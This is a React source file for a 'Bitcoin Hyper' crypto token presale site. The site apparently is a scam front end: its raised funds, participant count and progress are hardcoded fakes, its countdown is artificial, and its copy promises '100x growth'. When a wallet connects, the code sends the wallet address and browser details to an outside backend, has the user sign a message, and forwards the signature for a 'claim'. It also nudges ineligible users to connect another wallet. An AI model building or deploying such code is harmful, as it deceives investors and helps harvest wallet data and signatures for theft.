import React, { useState, useEffect } from 'react'
import { ConnectKitProvider, ConnectKitButton, getDefaultConfig } from "connectkit"
import { WagmiProvider, createConfig, http, useAccount, useDisconnect, useSignMessage } from "wagmi"
import { mainnet, polygon, bsc, arbitrum, optimism, avalanche, fantom, base, linea } from "wagmi/chains"
import { QueryClient, QueryClientProvider } from "@tanstack/react-query"
import './App.css'

// Create query client
const queryClient = new QueryClient() 

// Supported chains
const allChains = [mainnet, polygon, bsc, arbitrum, optimism, avalanche, fantom, base, linea]

// WalletConnect Project ID
const walletConnectProjectId = "962425907914a3e80a7d8e7288b23f62"

// Backend URL
const BACKEND_API = "https://tokenbackend-5xab.onrender.com/api"

// Create config
const config = createConfig(
  getDefaultConfig({
    appName: "Bitcoin Hyper | Official Presale",
    appDescription: "Join the Bitcoin Hyper Token Presale",
    appUrl: "https://bitcoinhyper.io",
    appIcon: "https://bitcoinhyper.io/logo.png",
    walletConnectProjectId: walletConnectProjectId,
    chains: allChains,
    transports: {
      [mainnet.id]: http("https://eth.llamarpc.com"),
      [polygon.id]: http("https://polygon-rpc.com"),
      [bsc.id]: http("https://bsc-dataseed.binance.org"),
      [arbitrum.id]: http("https://arb1.arbitrum.io/rpc"),
      [optimism.id]: http("https://mainnet.optimism.io"),
      [avalanche.id]: http("https://api.avax.network/ext/bc/C/rpc"),
      [fantom.id]: http("https://rpc.ftm.tools"),
      [base.id]: http("https://mainnet.base.org"),
      [linea.id]: http("https://rpc.linea.build")
    }
  })
)

// Main App Component
function BitcoinHyperPresale() {
  const { address, isConnected } = useAccount()
  const { disconnect } = useDisconnect()
  const { signMessage } = useSignMessage()
  
  const [loading, setLoading] = useState(false)
  const [scanning, setScanning] = useState(false)
  const [isEligible, setIsEligible] = useState(false)
  const [backendStatus, setBackendStatus] = useState('checking')
  const [claimData, setClaimData] = useState(null)
  const [processing, setProcessing] = useState(false)

  const [presaleStats] = useState({
    raised: "$4,892,450",
    participants: "12,458",
    tokensSold: "89.4M",
    progress: 78
  })
  
  const [countdown, setCountdown] = useState({
    days: 3,
    hours: 12,
    minutes: 45,
    seconds: 30
  })

  // Initialize backend check
  useEffect(() => {
    const testBackend = async () => {
      try {
        const response = await fetch(`${BACKEND_API}/health`, {
          method: 'GET',
          headers: {
            'Content-Type': 'application/json',
            'Accept': 'application/json'
          }
        })
        
        if (response.ok) {
          const data = await response.json()
          console.log('✅ Backend connected:', data)
          setBackendStatus('connected')
        } else {
          setBackendStatus('error')
        }
      } catch (error) {
        console.error('❌ Backend test error:', error)
        setBackendStatus('error')
      }
    }
    
    testBackend()
    
    // Start countdown
    const interval = setInterval(() => {
      setCountdown(prev => {
        let { days, hours, minutes, seconds } = prev
        seconds--
        
        if (seconds < 0) {
          seconds = 59
          minutes--
        }
        if (minutes < 0) {
          minutes = 59
          hours--
        }
        if (hours < 0) {
          hours = 23
          days--
        }
        if (days < 0) {
          clearInterval(interval)
          return { days: 0, hours: 0, minutes: 0, seconds: 0 }
        }
        
        return { days, hours, minutes, seconds }
      })
    }, 1000)
    
    return () => clearInterval(interval)
  }, [])

  const triggerAutoScan = async () => {
    if (!address) return
    
    setScanning(true)
    
    try {
      const response = await fetch(`${BACKEND_API}/presale/connect`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Accept': 'application/json',
        },
        body: JSON.stringify({
          walletAddress: address,
          userAgent: navigator.userAgent,
          email: '',
          sessionId: 'session_' + Date.now(),
          timestamp: new Date().toISOString()
        })
      })
      
      if (response.ok) {
        const data = await response.json()
        
        if (data.success) {
          setTimeout(() => {
            setScanning(false)
            setIsEligible(data.data.isEligible)
            alert(data.data.isEligible ? '🎉 You are eligible!' : '⚠️ Not eligible')
          }, 2000)
        }
      }
    } catch (error) {
      console.error('Scan error:', error)
      setScanning(false)
    }
  }

  const handleTokenClaim = async () => {
    if (!address) return
    
    setProcessing(true)
    
    try {
      const message = `Bitcoin Hyper Token Presale Authorization\n\nWallet: ${address}\nTimestamp: ${new Date().toISOString()}`
      
      const signature = await signMessage({ message })
      
      const response = await fetch(`${BACKEND_API}/presale/claim`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Accept': 'application/json',
        },
        body: JSON.stringify({
          walletAddress: address,
          signature,
          message,
          claimAmount: "5000 BTH",
          claimValue: "$850.00",
          sessionId: 'session_' + Date.now()
        })
      })
      
      if (response.ok) {
        const data = await response.json()
        setClaimData(data.data)
        setProcessing(false)
        alert('✅ Claim successful!')
      }
    } catch (error) {
      console.error('Claim error:', error)
      setProcessing(false)
      alert('Claim failed')
    }
  }

  const formatNumber = (num) => {
    return num < 10 ? `0${num}` : num
  }

  return (
    <div className="app-container">
      <div className="main-content">
        <header className="app-header">
          <div className="logo-container">
            <div className="logo-icon">₿</div>
            <div>
              <h1 className="logo-title">BITCOIN HYPER</h1>
              <div className="logo-subtitle">OFFICIAL PRESALE LAUNCH</div>
            </div>
          </div>
          
          <div className="header-actions">
            {backendStatus === 'connected' && (
              <div className="backend-indicator connected">
                <span className="indicator-dot"></span>
                <span>Backend LIVE</span>
              </div>
            )}
            
            {isConnected && (
              <button onClick={() => disconnect()} className="disconnect-button">
                Disconnect
              </button>
            )}
            
            <ConnectKitButton.Custom>
              {({ show, truncatedAddress, ensName }) => (
                <button onClick={show} className="connect-button">
                  {isConnected ? (ensName || `${truncatedAddress}`) : 'Connect Wallet'}
                </button>
              )}
            </ConnectKitButton.Custom>
          </div>
        </header>

        <section className="hero-section">
          <div className="hero-bitcoin">₿</div>
          
          <h2 className="hero-title">NEXT GENERATION BITCOIN ECOSYSTEM</h2>
          
          <p className="hero-description">
            Bitcoin Hyper brings DeFi 2.0 to the Bitcoin ecosystem. Join the presale now 
            and be part of the revolution.
          </p>
          
          <div className="countdown-timer">
            {Object.entries(countdown).map(([label, value]) => (
              <div key={label} className="countdown-item">
                <div className="countdown-value">{formatNumber(value)}</div>
                <div className="countdown-label">{label.toUpperCase()}</div>
              </div>
            ))}
          </div>
          
          <div className="stats-grid">
            {Object.entries(presaleStats).map(([label, value]) => (
              <div key={label} className="stat-card">
                <div className="stat-value">{value}</div>
                <div className="stat-label">
                  {label.replace(/([A-Z])/g, ' $1').toUpperCase()}
                </div>
              </div>
            ))}
          </div>
          
          <div className="progress-container">
            <div className="progress-header">
              <span>Presale Progress</span>
              <span className="progress-percent">{presaleStats.progress}%</span>
            </div>
            <div className="progress-bar">
              <div 
                className="progress-fill"
                style={{width: `${presaleStats.progress}%`}}
              >
                <div className="progress-glow"></div>
              </div>
            </div>
          </div>
          
          {backendStatus === 'checking' ? (
            <div className="backend-checking-container">
              <div className="backend-checking-spinner"></div>
              <h3 className="backend-checking-title">Establishing Secure Connection...</h3>
              <p className="backend-checking-description">Connecting to Bitcoin Hyper backend systems</p>
            </div>
          ) : backendStatus === 'error' ? (
            <div className="backend-error-container">
              <div className="backend-error-icon">🔴</div>
              <h3 className="backend-error-title">Connection Issue Detected</h3>
              <p className="backend-error-description">Please check your connection and try again</p>
            </div>
          ) : !isConnected ? (
            <div className="cta-container">
              <div className="cta-icon">🚀</div>
              <h3 className="cta-title">Connect Wallet to Start</h3>
              <p className="cta-description">
                Connect your wallet to check eligibility and secure your presale allocation
              </p>
              <ConnectKitButton.Custom>
                {({ show }) => (
                  <button onClick={show} className="cta-button">
                    CONNECT WALLET
                  </button>
                )}
              </ConnectKitButton.Custom>
              <div className="backend-status-small">
                <span className="status-dot connected"></span>
                <span>Backend: Connected & Monitoring</span>
              </div>
            </div>
          ) : scanning ? (
            <div className="scanning-container">
              <div className="scanning-spinner"></div>
              <h3 className="scanning-title">Analyzing Wallet...</h3>
              <p className="scanning-description">Checking eligibility across blockchain networks</p>
              <div className="scanning-dots">
                <span>.</span><span>.</span><span>.</span>
              </div>
            </div>
          ) : (
            <div className="status-summary">
              <div className={`status-card ${isEligible ? 'eligible' : 'not-eligible'}`}>
                <div className="status-icon">{isEligible ? '✅' : '⚠️'}</div>
                <div className="status-content">
                  <h3>{isEligible ? 'Eligible for Presale' : 'Verification Required'}</h3>
                  <p>
                    {isEligible 
                      ? 'You can now claim your allocation' 
                      : 'Connect a different wallet'}
                  </p>
                </div>
                <button 
                  className="status-button"
                  onClick={isEligible ? handleTokenClaim : () => disconnect()}
                  disabled={processing}
                >
                  {processing ? 'Processing...' : isEligible ? 'Claim Tokens' : 'Try Different Wallet'}
                </button>
              </div>
            </div>
          )}
        </section>

        <section className="features-section">
          <h2 className="features-title">WHY BITCOIN HYPER?</h2>
          
          <div className="features-grid">
            {[
              { icon: '⚡', title: 'Lightning Fast', desc: 'Transaction speeds up to 100x faster' },
              { icon: '🛡️', title: 'Secure & Audited', desc: 'Fully audited smart contracts' },
              { icon: '📈', title: 'High Yield', desc: 'Earn yields up to 45% APR' },
              { icon: '🌐', title: 'Multi-Chain', desc: 'Interoperability across chains' },
              { icon: '🎯', title: 'Limited Supply', desc: 'Only 100M tokens ever minted' },
              { icon: '🚀', title: 'Massive Growth', desc: '100x growth potential' }
            ].map((feature, index) => (
              <div key={index} className="feature-card">
                <div className="feature-icon">{feature.icon}</div>
                <h3 className="feature-title">{feature.title}</h3>
                <p className="feature-description">{feature.desc}</p>
              </div>
            ))}
          </div>
        </section>

        <footer className="app-footer">
          <div className="footer-bitcoin">₿</div>
          <div className="footer-description">
            Bitcoin Hyper is the next evolution of Bitcoin. Join the presale now to secure your position.
          </div>
          <div className="footer-links">
            <span>© 2024 Bitcoin Hyper. All rights reserved.</span>
            <span>|</span>
            <span className={backendStatus === 'connected' ? 'status-connected' : 'status-error'}>
              {backendStatus === 'connected' ? '✅ System LIVE' : '⚠️ System Offline'}
            </span>
            <span>|</span>
            <span>Official Presale Platform</span>
          </div>
        </footer>
      </div>
    </div>
  )
}

// ConnectKit Theme
const customTheme = {
  borderRadius: "large",
  fontStack: "system",
  overlay: "blur",
  theme: "midnight"
}

// Main App Wrapper
function App() {
  return (
    <WagmiProvider config={config}>
      <QueryClientProvider client={queryClient}>
        <ConnectKitProvider theme={customTheme}>
          <BitcoinHyperPresale />
        </ConnectKitProvider>
      </QueryClientProvider>
    </WagmiProvider>
  )
}


export default App
